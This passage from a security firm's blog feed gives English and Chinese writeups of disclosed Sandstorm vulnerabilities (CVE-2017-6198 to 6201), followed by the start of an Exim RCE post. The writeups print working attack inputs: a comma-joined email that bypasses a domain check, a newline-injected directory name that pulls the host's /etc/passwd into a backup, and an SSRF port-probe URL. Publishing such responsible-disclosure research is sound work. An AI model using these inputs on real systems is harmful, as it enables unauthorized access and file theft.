  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;KJ_SYSCALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_NOFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Since supervisor does not restrict the amount of subprocesses and storage usage, attackers can raise a resource exhaustion attack to crash the server by simply uploading a malicious app which keeps calling fork() (aka the “fork bomb”) or consumes huge storage space.&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6199&quot;&gt;CVE-2017-6199&lt;/h3&gt;

&lt;p&gt;Usually Sandstorm will designate unique permissions to the specific members of a certain organization, and the default membership validation method is to check user’s email address and see whether the string after &lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt; exists in their white list. See the codes below:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;identity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;@&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;emailDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Therefore, when an attacker fills in an email like &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; and the system will automatically consider the attacker a member of the &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; organization.&lt;/p&gt;

&lt;p&gt;Another key factor that contributes to the successful attack lies in one of the features when users log on Sandstorm. Users does not need to set up passwords for Sandstorm. Each time when the users need to log onto the service, they only need to fill in their email address, and they’ll receive a set of random unique password for login. The reason why the example above works is because the system treats &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; as a user from aaa.bbb domain, and the random password will be sent to the two email addresses, &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ccc@aaa.bbb&lt;/code&gt; As long as one can receive the password, they can log in to use the service.&lt;/p&gt;

&lt;p&gt;Below is a quick demonstration:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;On Sandstorm, restrict access to users from domain &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; only.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;On login page, fill in &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; for the email field.&lt;br /&gt;
(Note: at the front end, the email field is checked with HTML5 validation, but it is not further checked for validity at the back end)&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Retrieve random password in demo@devco.re mailbox.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Login successful. &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; is considered as a user and member of &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; organization!&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In our pentesting, the target website allowed users from validated domains to install their own apps. Therefore, through this bypass exploit, further attacks could be accomplished by combining other vulnerabilities described in this blog post (CVE-2017-6198, CVE-2017-6200, CVE-2017-6201).&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6200&quot;&gt;CVE-2017-6200&lt;/h3&gt;

&lt;p&gt;This is an interesting vulnerability. Totally two little validation flaws were exploited to initiate this attack!&lt;br /&gt;
On Sandstorm, owners of each Grain (Sandstorm container, in short, an app sandbox) can download their backup data for the app. But because of the two vulnerabilities in the packing process, an attacker can pack the files under the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/run&lt;/code&gt; directories located on the server outside the sandbox. The security issues were as follows:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;The packing process has hid &lt;code class=&quot;highlighter-rouge&quot;&gt;/var&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and other sensitive directories, but did not hide &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc.host&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/run.host&lt;/code&gt; these two directories. These directories are the aliases for the directories &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/run&lt;/code&gt; on the server respectively, which are relatively newer features.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The system will pack the legitimate files, have them sorted out, and create zip packages through the standard input interface. The separation between files are determined by line-breaks (&lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt;). As a result, when a line-break string appears in the file name, illegal path file names can be injected and packed with zip. Although the app checks whether there is a line-break in the file name, but the directory name was not checked.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;By using these two vulnerabilities together, the attacker simply has to create a directory in the sandbox &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt; , then backup files containing &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; on the server can be retrieved through backup downloading function.&lt;/p&gt;

&lt;p&gt;Screenshot of a real-world scenario:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;First, create a new directory in Grain &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;, and use the Grain Backup function to download the backup file.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;After unzipping the backup file, from &lt;code class=&quot;highlighter-rouge&quot;&gt;etc.host&lt;/code&gt; we’ll see &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; of the server outside the sandbox.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;cve-2017-6201&quot;&gt;CVE-2017-6201&lt;/h3&gt;

&lt;p&gt;This is a classic SSRF (Server-Side Request Forgery) issue. Sandstorm allow installation of apps from arbitrary sources, and an attacker can simply let the server access a certain location by providing an installation URL. The problem was identified on &lt;code class=&quot;highlighter-rouge&quot;&gt;https://[target]/install/xxxChangeItEveryTimexxx?url=http://127.0.0.1:22/&lt;/code&gt; This sample link confirms whether the server’s port 22 is open.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180126/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;center&gt;(Parse Error, which implies server’s port 22 is open)&lt;/center&gt;

&lt;h2 id=&quot;follow-up-updates&quot;&gt;Follow-up Updates&lt;/h2&gt;

&lt;p&gt;After we reported the vulnerabilities, Sandstorm fixed it immediately and then published an article:&lt;br /&gt;
&lt;a href=&quot;https://sandstorm.io/news/2017-03-02-security-review&quot;&gt;https://sandstorm.io/news/2017-03-02-security-review&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Through this pentesting experience, we consider Sandstorm a safe platform with outstanding security mechanisms. This is mainly attributed to its fundamental design rationale: to assume that every app installed is malicious. With this vigilant assumption, Sandstorm’s defence mechanisms for the core system become comprehensive and watertight. Apart from the server-side protection, some common client-side attacks (such as XSS, CSRF) are handled properly by Sandstorm’s unique countermeasures, such as host name randomization. That is, it is very difficult for attackers to sabotage the server by simply manipulating the apps, and so does privilege escalation through attacking at the client-side.&lt;/p&gt;

&lt;p&gt;Nevertheless, such an impressive platform still had some minor mistakes which led to security issues. Most of the vulnerabilities found this time are improper usages of libraries or negligence of existing defence architecture while introducing new features. These types of vulnerability are also common in our other projects. We would like to take the opportunity to remind developers, always present a comprehensive security review especially when developing new features to avoid vulnerabilities caused by the gaps between defence mechanisms.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/</link>
                <guid>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en</guid>
                <pubDate>Fri, 26 Jan 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>一次在 Sandstorm 跳脫沙箱的滲透經驗</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/&quot;&gt;Sandstorm Security Review&lt;/a&gt; (English Version)  &lt;br /&gt;
&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/&quot;&gt;一次在 Sandstorm 跳脫沙箱的滲透經驗&lt;/a&gt; (中文版本)&lt;/p&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;2017 年初，我們有個滲透測試專案，專案的標的架構在 &lt;a href=&quot;https://sandstorm.io/&quot;&gt;Sandstorm&lt;/a&gt; 之上。Sandstorm 是一款 Web 平台，使用者可以輕易的在該平台安裝各種 Web App（如 WordPress、GitLab…），該平台最大的特色在於這些 App 都是在沙箱中執行。因此，即使我們測試中找到多項 App 弱點，也無法對平台本身造成威脅。&lt;/p&gt;

&lt;p&gt;為了讓弱點效益最大化，我們將一部分精力轉移到研究 Sandstorm 原始碼，目的是跳脫 App 的沙箱環境看有沒有機會影響整台伺服器。最後，我們找到了幾個少見且有趣的弱點，並申請 CVE 編號如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;阻斷服務攻擊（Denial of Service），CVE-2017-6198&lt;/li&gt;
  &lt;li&gt;繞過授權模式（Bypassing Authorization Schema），CVE-2017-6199&lt;/li&gt;
  &lt;li&gt;不安全的直接存取物件（Insecure Direct Object References），CVE-2017-6200&lt;/li&gt;
  &lt;li&gt;服務端請求偽造（Server-Side Request Forgery），CVE-2017-6201&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;漏洞細節&quot;&gt;漏洞細節&lt;/h2&gt;

&lt;h3 id=&quot;cve-2017-6198&quot;&gt;CVE-2017-6198&lt;/h3&gt;

&lt;p&gt;這是一個消耗系統資源造成的 DoS。起因是 Sandstorm 並未完善限制每個 App 所能使用的資源，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;src/sandstorm/supervisor.c++&lt;/code&gt; 僅限制了每個程序能夠打開的最多檔案數，相關程式碼如下：&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SupervisorMain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setResourceLimits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rlimit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_cur&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;KJ_SYSCALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_NOFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;由於 supervisor 未限制子程序數量以及未限制儲存空間用量，因此攻擊者只要讓 App 不斷執行 fork（通常稱為 Fork Bomb）或是大量使用硬碟空間，就會造成伺服器資源不足而中斷服務。&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6199&quot;&gt;CVE-2017-6199&lt;/h3&gt;

&lt;p&gt;通常 Sandstorm 會設定特定組織成員才能擁有特殊的權限，而系統預設的組織成員判斷方式是檢查使用者 email 中「@」符號最後的字串是否在白名單內，相關程式碼如下：&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;identity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;@&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;emailDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;因此，當攻擊者填入的 email 為 &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt;，系統便會將攻擊者視為 &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; 組織的使用者。&lt;/p&gt;

&lt;p&gt;這項攻擊得以成功還有另外一個關鍵點，發生在 Sandstorm 登入的一個特色上。使用 Sandstorm 服務不需要設定密碼，使用者每次欲登入時填入 email，系統便會發送一組每次皆不同的隨機密碼作為登入使用。上述的例子之所以能夠成功，就是因為系統將 &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; 視為一個 aaa.bbb 網域的使用者，而隨機密碼會發送到 &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re&lt;/code&gt; 以及 &lt;code class=&quot;highlighter-rouge&quot;&gt;ccc@aaa.bbb&lt;/code&gt; 兩個不同信箱中，只要可以收到密碼就可以登入使用服務。&lt;/p&gt;

&lt;p&gt;直接案例說明：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;在 Sandstorm 限定只有用 &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; 網域才可以登入。&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;登入處 email 欄位填入 &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt;。（註：email 欄位在前端有用 HTML5 Validation，但後端並無檢查 email 是否合法）&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在 demo@devco.re 信箱收到隨機密碼。&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;成功登入，&lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; 被視為一個使用者，且為 &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; 組織成員！&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;在我們的滲透測試中，標的網站是允許認證的網域使用者自行安裝 App 的。因此透過這項繞過弱點，攻擊者可以再搭配本篇其他漏洞（CVE-2017-6198、CVE-2017-6200、CVE-2017-6201）做更進一步的攻擊。&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6200&quot;&gt;CVE-2017-6200&lt;/h3&gt;

&lt;p&gt;這是一個有趣的弱點，總共組合了兩個驗證上的小疏忽才能達成攻擊！&lt;br /&gt;
在 Sandstorm 中每個 Grain（Sandstorm container，簡單來說就是一個 App 沙箱）的擁有者都可以下載該 App 的備份資料，但由於打包流程中存在兩個弱點，因此攻擊者可以打包沙箱外伺服器的 &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;/run&lt;/code&gt; 下的檔案。發生的問題如下：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;打包的流程隱藏了 &lt;code class=&quot;highlighter-rouge&quot;&gt;/var&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;/proc&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt; 等敏感目錄，卻沒有隱藏 &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc.host&lt;/code&gt; 及 &lt;code class=&quot;highlighter-rouge&quot;&gt;/run.host&lt;/code&gt; 這兩個目錄。這兩個目錄分別是伺服器下 &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;/run&lt;/code&gt; 的別名，是較後期的功能。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;系統會將欲打包的合法檔案整理出來透過標準輸入介面傳給 zip 打包，而判斷檔案和檔案間的區隔是靠換行符號(&lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt;)。因此，當檔名中出現換行符號，可以插入非法的路徑檔名藉由 zip 打包。程式雖然有檢查檔名是否存在換行符，卻疏忽了檢查目錄名。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;綜合上述兩個弱點，攻擊者只要在沙箱內建立一個目錄 &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;，就可以透過下載備份的功能取得含有伺服器 &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; 檔案的備份檔。&lt;/p&gt;

&lt;p&gt;實際情境截圖：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;先在 Grain 裡新建目錄 &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;，並用 Grain Backup 的功能下載備份檔。&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;解開備份檔後在 &lt;code class=&quot;highlighter-rouge&quot;&gt;etc.host&lt;/code&gt; 目錄下看到沙箱外伺服器的 &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;cve-2017-6201&quot;&gt;CVE-2017-6201&lt;/h3&gt;

&lt;p&gt;這是經典的 SSRF（Server-Side Request Forgery）問題，在 Sandstorm 安裝 App 流程沒有限制安裝來源，攻擊者提供一個安裝 URL 就能讓伺服器存取該位置。該問題發生在 &lt;code class=&quot;highlighter-rouge&quot;&gt;https://[target]/install/xxxChangeItEveryTimexxx?url=http://127.0.0.1:22/&lt;/code&gt;，這個範例連結得以確認伺服器的 22 port 是否開啟。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180126/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;center&gt;（Parse Error，代表伺服器 22 port 開啟）&lt;/center&gt;

&lt;h2 id=&quot;後續&quot;&gt;後續&lt;/h2&gt;

&lt;p&gt;在提交弱點後，Sandstorm 官方非常迅速修正了弱點，並且發表了一篇文章：&lt;br /&gt;
&lt;a href=&quot;https://sandstorm.io/news/2017-03-02-security-review&quot;&gt;https://sandstorm.io/news/2017-03-02-security-review&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在這次滲透經驗中，我們認為 Sandstorm 是一款安全、有出色防禦機制的平台。主要原因取決於它的一個核心設計理念：就是假設使用者安裝的 App 都是惡意的。以這樣的前提出發去保護核心系統的安全，建立起來的防禦機制自然是全面且完善的。除了伺服器本身的保護，一些常見的客戶端攻擊（例如：XSS、CSRF）也透過 Sandstorm 特殊的隨機 hostname 等機制保護的很好。因此攻擊者很難從 App 本身去破壞伺服器，也很難透過攻擊客戶端去提升使用者的權限。&lt;/p&gt;

&lt;p&gt;儘管是如此優秀的平台，仍舊會因一些小地方疏忽導致攻擊者有機可乘。這次發現弱點的地方多半在於 library 的誤用和新功能的撰寫沒有考慮到舊有防禦架構。這在其他專案也是常見的問題，藉機也提醒開發者在開發新功能時應做全面的安全檢視，以避免防禦落差所導致的弱點。&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/</link>
                <guid>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200</guid>
                <pubDate>Fri, 26 Jan 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA</title>
                <description>&lt;p&gt;On 23 November, 2017, we reported two vulnerabilities to Exim. These bugs exist in the SMTP daemon and attackers do not need to be authenticated, including CVE-2017-16943 for a use-after-free (UAF) vulnerability, which leads to Remote Code Execution (RCE); and CVE-2017-16944 for a Denial-of-Service (DoS) vulnerability.&lt;/p&gt;

